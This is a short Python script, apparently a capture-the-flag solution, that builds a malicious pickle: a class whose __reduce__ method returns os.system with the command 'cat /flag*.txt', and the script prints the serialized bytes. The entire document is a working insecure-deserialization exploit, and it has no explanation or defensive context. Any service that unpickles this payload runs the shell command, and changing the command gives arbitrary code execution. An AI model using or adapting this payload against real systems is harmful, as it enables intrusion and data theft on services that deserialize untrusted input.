import os
import pickle


class A:
    def __reduce__(self):
        return (os.system, ("cat /flag*.txt",))


print(pickle.dumps(A()))
